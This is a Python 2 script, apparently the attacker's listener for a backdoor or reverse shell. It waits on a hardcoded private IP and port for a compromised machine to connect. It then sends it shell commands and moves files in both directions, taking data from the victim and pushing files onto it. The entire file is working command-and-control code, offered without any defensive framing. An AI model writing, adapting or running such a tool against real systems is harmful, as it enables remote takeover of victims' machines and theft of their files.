#!/usr/bin/python
import socket
import json
import base64
import sys


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        (self.connection, address) = listener.accept()
        print("[+] Got a connection" + str(address))
        print("\n[+] Connection established.\n")

    def get_input_message(self):
        command = raw_input(">> ")
        command = command.split(" ")
        return command

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)
        if data[0] == "exit":
            self.connection.close()
            sys.exit()

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)

                return json.loads(json_data)
            except ValueError:
                continue
        return json.loads(json_data)

    def give_client_message(self):
        command = self.get_input_message()
        if command[0].lower() == "upload":
            command.append(self.read_file(command[1]))
        self.reliable_send(command)
        client_message = self.reliable_receive()
        result = client_message
        if command[0].lower() == "download":
            result = self.write_file(command[1], client_message)
        return result

    def notify_result_message(self, result):
        print(result)

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download " + path + " successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            result = self.give_client_message()
            self.notify_result_message(result)


my_listener = Listener("192.168.239.153", 4567)
my_listener.run()